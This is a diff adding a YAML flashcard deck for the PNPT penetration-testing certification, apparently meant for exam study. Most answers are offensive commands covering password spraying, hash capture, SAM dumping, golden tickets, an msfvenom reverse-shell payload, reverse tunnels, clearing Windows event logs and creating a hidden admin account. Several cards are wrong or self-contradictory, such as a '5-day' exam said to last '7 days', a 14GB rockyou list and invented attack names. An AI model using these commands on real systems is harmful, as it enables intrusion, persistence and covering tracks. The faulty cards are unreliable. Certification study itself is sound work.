@@ -1,0 +1,403 @@
+title: PNPT
+description: Practical Network Penetration Tester — TCM Security certification covering external, internal, and AD attacks
+cards:
+- question: What is the PNPT exam format?
+  answer: '5-day exam: 7 days of external pentesting + internal network + AD compromise chain + report...'
+- question: What does the PNPT exam require in addition to hacking?
+  answer: A professional penetration testing report and recorded video presentation
+- question: What is the primary difference between PNPT and OSCP?
+  answer: PNPT focuses on real-world AD environment with multiple attack paths, report writing, and...
+- question: What OSINT tool gathers email addresses from a domain?
+  answer: theHarvester -d domain.com -b google,linkedin,hunter
+- question: What tool searches for breached credentials by email?
+  answer: Dehashed (API-based)
+- question: What tool finds employees on LinkedIn?
+  answer: linkedin2username
+- question: What tool finds subdomains via certificate transparency logs?
+  answer: crt.sh (via crt.sh website or curl 'https://crt.sh/?q=%25.domain.com&output=json')
+- question: What is the best passive subdomain enumeration tool?
+  answer: Sublist3r or amass
+- question: What tool performs DNS brute-force for subdomains?
+  answer: dnsrecon -d domain.com -D wordlist.txt -t brt
+- question: What tool identifies WAF with fingerprinting?
+  answer: wafw00f
+- question: What is Google dorking?
+  answer: Using advanced Google search operators to find exposed information
+- question: What Google dork finds login pages?
+  answer: inurl:login site:domain.com
+- question: What Google dork finds exposed files?
+  answer: filetype:pdf site:domain.com
+- question: What Shodan search finds RDP exposed?
+  answer: port:3389 country:US
+- question: What Shodan search finds OpenSSH?
+  answer: product:"OpenSSH"
+- question: What Censys query finds a specific service?
+  answer: 'services.service_name: HTTP and location.country: US'
+- question: What is password spraying?
+  answer: Trying a single common password against many user accounts to avoid lockout
+- question: What tool password sprays against Exchange/OWA?
+  answer: MailSniper (PowerShell)
+- question: What is MFA bypass with EvilGinx2?
+  answer: A reverse proxy that captures credentials and session tokens from MFA
+- question: What GoPhish feature handles campaign management?
+  answer: Phishing templates, landing pages, sending profiles, groups, and campaign tracking
+- question: What is the Responder tool used for?
+  answer: LLMNR, NBT-NS, and MDNS poisoning to capture NTLMv2 hashes
+- question: What Responder command starts poisoning on an interface?
+  answer: responder -I eth0 -rdw
+- question: What does the -r flag do in Responder?
+  answer: Enables SQL Server poisoning
+- question: What does the -w flag do in Responder?
+  answer: Enables WPAD proxy server
+- question: What tool analyzes Responder captured hashes?
+  answer: john or hashcat with mode 5600 (NetNTLMv2)
+- question: What is Inveigh?
+  answer: Windows-based LLMNR/NBT-NS/mDNS spoofer similar to Responder
+- question: What crackmapexec command tests credentials?
+  answer: crackmapexec smb target -u user -p password
+- question: What crackmapexec flag performs password spraying?
+  answer: crackmapexec smb target -u users.txt -p Password123 --continue-on-success
+- question: What crackmapexec protocol tests WinRM credentials?
+  answer: crackmapexec winrm target -u user -p password
+- question: What crackmapexec protocol tests LDAP credentials?
+  answer: crackmapexec ldap target -u user -p password
+- question: What crackmapexec feature dumps SAM hashes?
+  answer: crackmapexec smb target -u user -p password --sam
+- question: What crackmapexec feature executes commands?
+  answer: crackmapexec smb target -u user -p password -x whoami
+- question: What is LDAP domain dump?
+  answer: Using ldapdomaindump to extract AD structure, users, groups, computers, and policies
+- question: What ldapdomaindump command dumps domain info?
+  answer: ldapdomaindump ldap://target -u 'domain\user' -p password
+- question: What tool queries AD for user enumeration?
+  answer: PowerView (Get-DomainUser, Get-DomainComputer, Get-DomainGroup)
+- question: What PowerView command lists all domain users?
+  answer: Get-DomainUser | select samaccountname
+- question: What PowerView command lists domain admins?
+  answer: Get-DomainGroupMember 'Domain Admins'
+- question: What PowerView command finds computers with unconstrained delegation?
+  answer: Get-DomainComputer -Unconstrained
+- question: What PowerView command finds user ACLs?
+  answer: Get-ObjectAcl -SamAccountName user -ResolveGUIDs
+- question: What is the generic PowerShell command to import PowerView?
+  answer: . .\PowerView.ps1
+- question: What is the TCM approach to AD enumeration?
+  answer: Start with ldapdomaindump, then BloodHound for attack paths, then specific abuse
+- question: What BloodHound node represents a user?
+  answer: User node (circle with person icon)
+- question: What BloodHound node represents a computer?
+  answer: Computer node (square monitor icon)
+- question: What BloodHound node represents a group?
+  answer: Group node (diamond with people icon)
+- question: What BloodHound node represents a domain?
+  answer: Domain node (triangle)
+- question: What BloodHound query finds all domain admins?
+  answer: 'MATCH p = (n:User) -[:MemberOf*1..]-> (g:Group {name: ''DOMAIN ADMINS@DOMAIN''}) RETURN p'
+- question: What BloodHound edge is 'CanRDP'?
+  answer: A user/computer can RDP into another computer
+- question: What BloodHound edge is 'ExecuteDCOM'?
+  answer: A user can execute code via DCOM on a remote machine
+- question: What BloodHound edge is 'SQLAdmin'?
+  answer: A user is a sysadmin on a SQL server instance
+- question: What is the highest-value BloodHound path?
+  answer: Shortest path from owned objects to Domain Admins
+- question: What does BloodHound's 'Outbound Control' mean?
+  answer: A node has GenericAll/GenericWrite/WriteOwner/WriteDACL over another node
+- question: What is a pre-created computer account?
+  answer: A computer account created by an admin in AD that may have a predictable password
+- question: What tool checks for pre-created computer accounts?
+  answer: CrackMapExec with pre2k module
+- question: What is LAPS?
+  answer: Local Administrator Password Solution — manages local admin passwords per machine
+- question: Where are LAPS passwords stored?
+  answer: In AD attribute ms-Mcs-AdmPwd on the computer object
+- question: What command reads LAPS passwords?
+  answer: Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd
+- question: What does PowerView's Get-DomainGPO do?
+  answer: Enumerate Group Policy Objects in the domain
+- question: What is GPO abuse?
+  answer: Modifying GPOs via Group Policy Management to execute code on domain computers
+- question: What PowerView command finds users who can write GPOs?
+  answer: Get-DomainObjectAcl -SearchBase 'CN=Policies,CN=System,DC=domain,DC=com' -ResolveGUIDs
+- question: What tool modifies GPOs?
+  answer: SharpGPOAbuse
+- question: What is constrained delegation?
+  answer: Allows a service to delegate to specific services on specific computers only
+- question: What attribute stores constrained delegation?
+  answer: msDS-AllowedToDelegateTo
+- question: What is unconstrained delegation?
+  answer: Allows a service to delegate to any service on any computer — stores TGTs in memory
+- question: What tool extracts TGTs from unconstrained delegation?
+  answer: Mimikatz sekurlsa::tickets (dump), Rubeus dump
+- question: What Rubeus command extracts tickets?
+  answer: Rubeus dump /luid:0x... or Rubeus triage
+- question: What is RBCD abuse?
+  answer: Setting msDS-AllowedToActOnBehalfOfOtherIdentity on a computer to allow delegation
+- question: What domain user rights are needed for RBCD?
+  answer: GenericWrite/GenericAll on a computer object
+- question: What tool forces a password change via LDAP?
+  answer: net user user password /domain (Domain Users can change their own; admin can change any)
+- question: What is the Constrained Language Mode bypass?
+  answer: PowerShell CLM can be bypassed via reflection or by using other languages
+- question: What is the PSUACL abuse?
+  answer: Users with GenericWrite on a user can set SPN for Kerberoasting
+- question: What is the Shadow Credentials attack?
+  answer: Add Key Credential to an AD object and authenticate as that user using PKINIT
+- question: What tool adds Key Credentials?
+  answer: pyWhisker (Python), Whisker (PowerShell)
+- question: What does pyWhisker do?
+  answer: Manipulates msDS-KeyCredentialLink attribute for Shadow Credentials
+- question: What is the TCM approach for C2?
+  answer: Empire, Covenant, or Sliver for command and control
+- question: What is Empire?
+  answer: PowerShell/post-exploitation agent framework with listeners, stagers, and modules
+- question: What tool generates C2 stagers for Empire?
+  answer: Empire (usestager windows/launcher_bat)
+- question: What is Covenant?
+  answer: ASP.NET-based C2 framework with a web UI and Grunt agents
+- question: What is Sliver?
+  answer: Go-based C2 framework with mutual TLS, HTTP, and DNS protocols
+- question: What shell command generates an msfvenom C2 beacon?
+  answer: msfvenom -p windows/x64/meterpreter/reverse_https LHOST= LPORT= -f exe
+- question: What tool pivots through an SSH gateway?
+  answer: sshuttle
+- question: What sshuttle command routes subnet through a jump host?
+  answer: sshuttle -r user@target 172.16.0.0/12
+- question: What chisel command starts a reverse tunnel server?
+  answer: chisel server -p 8080 --reverse
+- question: What chisel command creates a reverse SOCKS tunnel?
+  answer: chisel client SERVER:8080 R:socks
+- question: What ligolo-ng command starts the proxy?
+  answer: ligolo-ng proxy -laddr 0.0.0.0:11601 -self-cert
+- question: What ligolo-ng command connects an agent?
+  answer: ligolo-ng agent -connect PROXY_IP:11601 -ignore-cert
+- question: What ligolo-ng command creates a tunnel interface?
+  answer: sudo ip tuntap add user USER mode tun ligolo
+- question: What is a TCP relay with socat?
+  answer: socat TCP-LISTEN:4444,fork TCP:10.10.10.10:4444
+- question: What impacket tool creates a SOCKS proxy?
+  answer: Impacket does not have a built-in SOCKS proxy; chisel or sshuttle are used
+- question: What tool creates a DNS tunnel for data exfiltration?
+  answer: dnscat2
+- question: What is the TCM approach to report writing?
+  answer: Executive summary, technical findings with risk ratings, PoC, remediation, appendix
+- question: What risk rating system does TCM recommend?
+  answer: CVSS v3.x with custom business impact adjustments
+- question: What should a critical finding include?
+  answer: Vulnerability name, affected systems, CVSS score, description, impact, steps to reproduce,...
+- question: How should a pentest report be delivered?
+  answer: Encrypted PDF with password sent separately in a different channel
+- question: What is the TCM external pentest methodology?
+  answer: OSINT → Subdomain enum → Port scan → Web app testing → Password spraying → Phishing
+- question: What tool enumerates SMB shares?
+  answer: smbclient -L //target -U user, or enum4linux-ng
+- question: What enum4linux command lists shares and users?
+  answer: enum4linux-ng -A target -u user -p password
+- question: What does enum4linux-ng enumerate?
+  answer: Users, groups, shares, OS info, sessions, password policy, SID mapping
+- question: What is the Null session attack?
+  answer: Connecting to SMB without credentials to enumerate information
+- question: What tool exploits Null sessions on SMB?
+  answer: enum4linux-ng, rpcclient -U '' target
+- question: What rpcclient command lists domain users via null session?
+  answer: rpcclient -U '' target -c enumdomusers
+- question: What rpcclient command lists domain groups?
+  answer: rpcclient -U '' target -c enumdomgroups
+- question: What command mounts an SMB share on Linux?
+  answer: mount -t cifs //target/share /mnt -o user=username
+- question: What Linux tool copies files to/from Windows via SMB?
+  answer: smbclient or mount + cp
+- question: What is the typical SMBGOP attack?
+  answer: CVE-2020-0796 (SMBv3 compression) and SMBGhost
+- question: What EternalBlue exploits SMBv1?
+  answer: MS17-010 (EternalBlue) targeting SMBv1 vulnerability
+- question: What Metasploit module exploits EternalBlue?
+  answer: exploit/windows/smb/ms17_010_eternalblue
+- question: What is the TCM approach to OSCP-like machines?
+  answer: Port scan → Enumerate services → Exploit → Privesc → Capture flags
+- question: What tool copies files over WinRM?
+  answer: evil-winrm with upload/download commands
+- question: What evil-winrm command uploads a file?
+  answer: upload local_file.ps1
+- question: What evil-winrm command downloads a file?
+  answer: download remote_file.txt
+- question: What evil-winrm flag enables credential via hash?
+  answer: -H HASH_VALUE
+- question: What is the TCM methodology for internal pentesting?
+  answer: Discovery → Port scan → Service enum → Vulnerability scan → Manual exploitation → Privesc →...
+- question: What tool performs internal network discovery?
+  answer: nmap -sn 192.168.1.0/24 or arp-scan
+- question: What Python script sends ARP requests for host discovery?
+  answer: arp-scan --localnet
+- question: What is the first step in intranet reconnaissance?
+  answer: Identify live hosts with nmap -sn or arp-scan
+- question: What tool performs a service version scan?
+  answer: nmap -sV -p- target (full port scan with version)
+- question: What NSE script finds MS17-010?
+  answer: nmap --script smb-vuln-ms17-010
+- question: What NSE script enumerates SMB users?
+  answer: nmap --script smb-enum-users
+- question: What NSE script finds RDP vulnerabilities?
+  answer: nmap --script rdp-vuln-ms12-020
+- question: What is the TCM approach for Windows privesc?
+  answer: Run winPEAS, check services, check registry for AutoLogon, check Unquoted Service Paths,...
+- question: What is the TCM approach for Linux privesc?
+  answer: Run linpeas, check SUID, sudo -l, writable scripts in cron, capabilities, kernel exploits
+- question: What is the winPEAS tool?
+  answer: Windows Privilege Escalation Awesome Script — finds common privesc vectors
+- question: What is the linpeas tool?
+  answer: Linux Privilege Escalation Awesome Script — finds common privesc vectors
+- question: What is the TCM guide for total domain compromise?
+  answer: Kerberoast → Crack hash → Privilege escalation to DA → DCSync → Golden ticket
+- question: What command creates a golden ticket with mimikatz?
+  answer: kerberos::golden /user:Administrator /domain:DOMAIN /sid:S-1-5-... /krbtgt:hash /id:500 /ptt
+- question: What command drops a golden ticket into memory?
+  answer: /ptt flag in mimikatz
+- question: What is the admin count difference in BloodHound?
+  answer: AdminCount attribute is set on privileged users; BloodHound uses it to identify likely...
+- question: What is TCM's recommendation for AV evasion?
+  answer: Use shellcode encryption, custom loaders, C# with unmanaged code, or PowerShell reflection
+- question: What Python tool encodes payloads for AV evasion?
+  answer: Veil (Veil-Evasion) generates payloads that bypass AV
+- question: What tool wraps executables to bypass AV?
+  answer: Shellter
+- question: What is the TCM methodology for password cracking?
+  answer: Use hashcat with rules, start with rockyou, leverage CeWL for target-specific words
+- question: What hashcat command cracks NTLMv2 with best64 rules?
+  answer: hashcat -m 5600 hash.txt rockyou.txt -r best64.rule
+- question: What is GPU cracking advantage?
+  answer: Hashcat uses GPU acceleration for orders of magnitude faster cracking
+- question: What hashcat command cracks NTLM with PRINCE?
+  answer: hashcat -m 1000 hash.txt --prince wordlist.txt
+- question: What is the TCM recommendation for password wordlists?
+  answer: RockYou, SecLists, CeWL-generated, and custom mutations
+- question: What is the average size of rockyou.txt?
+  answer: ~14GB uncompressed with ~14 million passwords
+- question: What tool modifies wordlists with mutations?
+  answer: hashcat rule engine or John the Ripper rules
+- question: What ceWL command scrapes a website for words?
+  answer: cewl -d 3 -m 6 -w wordlist.txt URL
+- question: How does the PNPT exam compare to the OSCP?
+  answer: PNPT is more real-world with AD, OSINT, and report; OSCP is more focused on standalone machines
+- question: What is the TCM web app testing methodology?
+  answer: Information gathering → Configuration review → Input validation → Auth/Session → Business...
+- question: What tool intercepts web traffic for testing?
+  answer: Burp Suite or Caido
+- question: What Burp Suite feature finds vulnerabilities?
+  answer: Active scanner (Pro), Intruder for fuzzing, Repeater for manual requests
+- question: What tool specifically tests for XXE?
+  answer: Burp Suite's Collaborator or manual payload injection
+- question: What is the difference between TCM and PNPT methodology?
+  answer: TCM is the training provider, PNPT is the certification; TCM teaches the methodology used...
+- question: What TCM course teaches external pentesting?
+  answer: Practical Ethical Hacking (PEH)
+- question: What TCM course teaches AD attacks?
+  answer: Practical AD Attacks and Defense
+- question: What is the TCM OSINT methodology?
+  answer: Physical location → People search → Email addresses → Breached credentials → Social media
+- question: What tool scrapes Google Maps for physical locations?
+  answer: Google Maps API or manual search
+- question: What tool searches for people by name?
+  answer: Pipl, Spokeo, or IntelTechniques
+- question: What tool searches for usernames across platforms?
+  answer: sherlock
+- question: What is Hunter.io used for?
+  answer: Finding email addresses associated with a domain
+- question: What is Phonebook.cz used for?
+  answer: Finding email addresses, domains, and URLs from breach data
+- question: What is the TCM password spraying methodology?
+  answer: Identify valid users → Spray common password → Wait 30-60 min → Check results
+- question: What tool sprays passwords against OWA?
+  answer: MailSniper (Invoke-PasswordSprayOWA)
+- question: What is the lockout threshold avoidance rule for spraying?
+  answer: Use a single password across many users, not many passwords per user
+- question: What is the TCM methodology for logging and monitoring bypass?
+  answer: Disable Windows event logging, use timestomp, clear PowerShell logs
+- question: What command clears PowerShell logs?
+  answer: Remove-EventLog -LogName 'Windows PowerShell'
+- question: What command clears Security logs?
+  answer: wevtutil cl Security
+- question: What is the TCM VPS recommendation?
+  answer: DigitalOcean or Linode droplet with Kali installed
+- question: What tool sets up a Kali VPS?
+  answer: DigitalOcean Kali image or manual Kali installation on any VPS
+- question: What is the TCM C2 infrastructure?
+  answer: VPS + redirectors + HTTPS certificates + domain fronting
+- question: What tool sets up redirectors?
+  answer: Haproxy or Nginx reverse proxy
+- question: What is the TCM methodology for domain takeover detection?
+  answer: Check NS records, MX records, TLS certificates, and expired domains
+- question: What DNS record type points to mail servers?
+  answer: MX record
+- question: What DNS record type maps domain to IPv6?
+  answer: AAAA record
+- question: What DNS record type maps domain to IPv4?
+  answer: A record
+- question: What is the TCM approach for mobile app security?
+  answer: Burp Suite with mobile proxy, check for insecure storage, hardcoded credentials, SSL...
+- question: What tool bypasses Android SSL pinning?
+  answer: Frida or objection
+- question: What Python tool automates AD attack chains?
+  answer: AD-autopwn or custom script chains
+- question: What is the TCM method for credentials in files?
+  answer: Search network shares for passwords, config files, .kdbx, .rdp, scripts
+- question: What tool searches for passwords in file shares?
+  answer: Snaffler or PowerView (Find-UserField -SearchField Description)
+- question: What PowerView command searches for passwords in AD descriptions?
+  answer: Find-UserField -SearchField Description -SearchTerm 'password'
+- question: What command searches file contents for passwords?
+  answer: findstr /si password *.txt *.xml *.ini *.config
+- question: What is the TCM approach to lateral movement?
+  answer: Pass-the-hash, WMI, WinRM, PSRemoting, SMB exec, task scheduler remote
+- question: What command executes remote WMI command?
+  answer: wmic /node:TARGET /user:USER /password:PASS process call create 'whoami'
+- question: What command executes remote PowerShell command?
+  answer: Invoke-Command -ComputerName TARGET -ScriptBlock { whoami } -Credential CRED
+- question: What command registers and starts a remote scheduled task?
+  answer: schtasks /create /s TARGET /tn Task /tr whoami /sc once /st 00:00 /ru SYSTEM /rp
+- question: What is the TCM methodology for persistence?
+  answer: Create local admin, backdoor services, scheduled tasks, registry Run keys, WMI persistence
+- question: What command creates a hidden local admin on Windows?
+  answer: net user hidden$ password /add && net localgroup Administrators hidden$ /add
+- question: What is the TCM exam format?
+  answer: 7-calendar-day access to the lab environment; report due within 7 days after completion
+- question: What TCM tool dumps browser passwords?
+  answer: SharpChrome or mimikatz (dpapi::chrome)
+- question: What TCM tool extracts saved RDP credentials?
+  answer: cmdkey /list and SharpRDP
+- question: What command lists cached credentials?
+  answer: cmdkey /list
+- question: What command runs as another user via runas?
+  answer: runas /user:domain\user cmd.exe
+- question: What is the TCM method for scanning for ms14-068?
+  answer: Domain Kerberos ticket vulnerability check with impacket or Metasploit
+- question: What TCM tool scans for misconfigured websites?
+  answer: Nikto, WhatWeb, WPScan
+- question: What Nikto command scans a URL?
+  answer: nikto -h URL
+- question: What WhatWeb command identifies technologies?
+  answer: whatweb URL
+- question: What WPScan command enumerates themes?
+  answer: wpscan --url URL --enumerate at
+- question: What is the TCM approach to red team operations?
+  answer: Full-scope adversary emulation with stealth, C2, persistence, and impact
+- question: What is the difference between the TCM cert and the syllabus?
+  answer: PNPT is a 5-day practical exam; TCM offers training courses that prepare for it
+- question: What is the TCM report executive summary requirement?
+  answer: Non-technical language readable by management, covering risk posture and key findings
+- question: What is the TCM risk rating scale for vulnerabilities?
+  answer: Critical, High, Medium, Low, Informational — based on CVSS with business context
+- question: What is the TCM recommendation for remediation evidence?
+  answer: Screenshots before fix, after fix, and command output showing the vulnerability resolved
+- question: What is the TCM appendix structure?
+  answer: Full scan results, tools used, wordlists, external IPs, important command outputs
+- question: What is the TCM methodology for report delivery?
+  answer: Encrypted PDF sent to authorized contacts, password sent via separate channel
+- question: What is the TCM methodology for client debrief?
+  answer: '30-60 min meeting: executive summary walk-through, prioritized findings, Q&A'
+- question: What is the TCM pentest retest policy?
+  answer: Limited retest of findings after remediation, typically within 2-4 weeks
+- question: What is TCM's Shadow Credentials fix?
+  answer: Disable PKINIT for sensitive accounts or monitor msDS-KeyCredentialLink attribute changes
+- question: What is the TCM password policy check command?
+  answer: crackmapexec smb target -u user -p pass --pass-pol
